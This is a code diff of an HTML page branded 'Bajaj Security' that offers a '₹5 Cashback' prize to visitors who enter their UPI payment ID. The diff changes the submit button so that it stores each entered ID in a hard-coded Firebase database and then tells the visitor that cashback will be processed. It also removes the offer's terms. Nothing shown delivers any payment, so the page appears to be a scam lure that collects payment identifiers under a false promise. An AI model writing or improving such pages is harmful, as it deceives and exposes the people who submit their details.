@@ -8,14 +8,20 @@
     <title>Bajaj Security</title>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
-    <link rel="icon" sizes="32x32" href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj4SLEHVYaXUtJTcldHUlojtAlY8TFMlUjgFOqALQHyoOPFLDBNkIpqELBJDKSEUdcjuCwJSeKcGZuffxKPLIUy3PvQDr-kqE6OYz3c0_hchcq0vHYiLtEsuO2qB68uDypgdwyJtDrEoqmQt90HZAQoEy-iesLom4KMK5pzt_4N-lma94xog5HxQbX4L5zk/s1600/1000074786.jpg">
+    <link rel="icon" sizes="32x32"
+        href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj4SLEHVYaXUtJTcldHUlojtAlY8TFMlUjgFOqALQHyoOPFLDBNkIpqELBJDKSEUdcjuCwJSeKcGZuffxKPLIUy3PvQDr-kqE6OYz3c0_hchcq0vHYiLtEsuO2qB68uDypgdwyJtDrEoqmQt90HZAQoEy-iesLom4KMK5pzt_4N-lma94xog5HxQbX4L5zk/s1600/1000074786.jpg">
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+    <!-- Firebase -->
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+
     <style>
         body {
             margin: 0;
             font-family: 'Roboto', sans-serif;
-            background-color: #FFFFFF;
-            color: #fff;
+            background-color: #000000; /* Black background */
+            color: #ffffff;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -46,6 +52,7 @@
             font-size: 24px;
             font-weight: 700;
             margin: 0;
+            color: #ffffff;
         }
 
         h2 {
@@ -62,7 +69,7 @@
         p {
             font-size: 14px;
             line-height: 1.5;
-            color: #aaa;
+            color: #ccc;
         }
 
         .input-container {
@@ -74,13 +81,13 @@
             display: block;
             margin-bottom: 5px;
             font-weight: 500;
-            color: #aaa;
+            color: #ccc;
         }
 
         .input-group {
             display: flex;
             align-items: center;
-            background-color: #333;
+            background-color: #222;
             border-radius: 5px;
             padding: 10px;
             margin-bottom: 15px;
@@ -126,14 +133,43 @@
             color: red;
             margin-top: 10px;
         }
+
+        #toast {
+            visibility: hidden;
+            min-width: 250px;
+            margin-left: -125px;
+            background: #333;
+            color: #fff;
+            text-align: center;
+            border-radius: 5px;
+            padding: 16px;
+            position: fixed;
+            left: 50%;
+            bottom: 30px;
+            opacity: 0;
+            transition: 0.5s;
+        }
+
+        #toast.show {
+            visibility: visible;
+            opacity: 1;
+            bottom: 50px;
+        }
+
+        #toast.success {
+            background: #28a745;
+        }
+
+        #toast.error {
+            background: #dc3545;
+        }
     </style>
 </head>
 
 <body>
     <div class="container">
         <div class="header">
-            <img src="https://i.ibb.co/dwhfBP8C/IMG-20250605-WA0001.jpg"
-                alt="Logo">
+            <img src="https://i.ibb.co/dwhfBP8C/IMG-20250605-WA0001.jpg" alt="Logo">
             <h1>BIG WINNER</h1>
         </div>
         <h2>Get ₹5 Cashback</h2>
@@ -149,41 +185,59 @@
         <button id="submitButton" class="btn">SUBMIT</button>
         <button id="verifyButton" class="btn btn-secondary">VERIFY AFTER DONE</button>
         <p id="statusMessage"></p>
-
-        <hr>
-        <h3>Steps To Avail Offer :</h3>
-        <ul>
-            <li class="text-left">Install Open App &amp;</li>
-            <li class="text-left">Register With OTP &amp; Wait for 2 min</li>
-        </ul>
-        <h3>Terms &amp; Conditions :</h3>
-        <ul>
-            <li class="text-left">Payment Type :- UPI</li>
-            <li class="text-left">Payment Time :- 24 Hours</li>
-            <li class="text-left">One UPI One Time</li>
-        </ul>
     </div>
 
+    <div id="toast"></div>
+
     <script>
-        $(document).ready(function () {
-            // SUBMIT -> Google
-            $("#submitButton").click(function (event) {
-                event.preventDefault();
-                let user = $("#user").val().trim();
+        // Firebase Config
+        const firebaseConfig = {
+            apiKey: "AIzaSyCZ58FEwAJnZnJpvDXruTyjdjxvmer7nB0",
+            authDomain: "app-test-3a56b.firebaseapp.com",
+            databaseURL: "https://app-test-3a56b-default-rtdb.firebaseio.com",
+            projectId: "app-test-3a56b",
+            storageBucket: "app-test-3a56b.appspot.com",
+            messagingSenderId: "317203215015",
+            appId: "1:317203215015:web:22ea37ff8acbdc63a3e182"
+        };
 
-                if (user === "") {
-                    $("#statusMessage").text("Please enter your UPI ID.");
-                    return;
-                }
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
 
-                $("#statusMessage").text("");
-                window.location.href = "https://www.google.com";
-            });
+        function showToast(message, type) {
+            const toast = document.getElementById("toast");
+            toast.textContent = message;
+            toast.className = `show ${type}`;
+            setTimeout(() => toast.className = toast.className.replace("show", ""), 3000);
+        }
 
-            // VERIFY -> Facebook
-            $("#verifyButton").click(function () {
-                window.location.href = "https://www.facebook.com";
-            });
+        // SUBMIT -> Save to Firebase
+        $("#submitButton").click(function (event) {
+            event.preventDefault();
+            let user = $("#user").val().trim();
+
+            if (user === "") {
+                showToast("Please enter your UPI ID.", "error");
+                return;
+            }
+
+            const newEntry = db.ref("users").push();
+            newEntry.set({
+                upi: user,
+                timestamp: new Date().toISOString()
+            })
+                .then(() => {
+                    showToast("UPI ID Saved! Cashback will be processed.", "success");
+                    $("#user").val("");
+                })
+                .catch(() => {
+                    showToast("Error saving data.", "error");
+                });
+        });
+
+        // VERIFY -> Redirect to Facebook
+        $("#verifyButton").click(function () {
+            window.location.href = "https://www.facebook.com";
         });
     </script>
 </body>
